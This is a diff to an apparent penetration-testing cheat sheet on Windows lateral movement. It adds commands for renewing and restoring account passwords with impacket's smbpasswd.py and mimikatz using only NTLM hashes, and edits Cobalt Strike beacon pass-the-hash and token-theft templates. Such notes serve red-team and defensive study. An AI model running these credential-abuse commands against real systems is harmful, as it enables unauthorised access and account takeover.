@@ -1,5 +1,26 @@
 # Windows - Lateral movements
 
+### Expired password renewal
+
+Expired password of local or domain accounts can be renewed over `SMB`
+(`MSRPC-SAMR`) using `impacket`'s `smbpasswd.py` Python script. `smbpasswd.py`
+supports authentication using an account `NTLM` hash.
+
+```
+smbpasswd.py [-newpass '<NEW_PASSWORD>'] <USERNAME>[:<CURRENT_PASSWORD>]@<HOSTNAME | IP>
+smbpasswd.py [-newpass '<NEW_PASSWORD>'] -hashes <CURRENT_NT_HASH> <USERNAME>@<HOSTNAME | IP>
+```
+
+The account's previous password can be restored using `mimikatz`'s
+`lsadump::changentlm` function with only the knowledge of the previous `NTLM`
+hash. Note that the minimum password age policy setting may prevent an
+immediate password restoration.
+
+```
+mimikatz # privilege::debug
+mimikatz # lsadump::changentlm /server:<DC_FQDN | HOSTNAME> /user:<USERNAME> [/oldpassword:<CURRENT_PASSWORD> | /old:<CURRENT_NT_HASH>] [/newpassword:<NEW_PASSWORD> | /new:<NEW_NT_HASH>]
+```
+
 ### Local credential re-use
 
 The local re-use of credentials consist of starting a process on the local
@@ -136,7 +157,7 @@ Any token change can be reverted using the beacon command `rev2self`.
 
 ```
 # Both local and over the network impersonation
-beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<HASH_NTLM> /run:"powershell -w hidden"
+beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"powershell -w hidden"
 beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes128:<USER_AES128_KEY> | /aes256:<USER_AES256_KEY>] /run:"powershell -w hidden"
   [...]
   PID <PID>
@@ -144,7 +165,7 @@ beacon> mimikatz sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> [/aes1
 beacon> steal_token <PID>
 
 # Over the network ("/NetOnly") impersonation
-pth <. | DOMAIN>\<USERNAME> <HASH_NTLM>
+pth <. | DOMAIN>\<USERNAME> <NT_HASH>
 ```
 
 ###### PowerShell Credential option
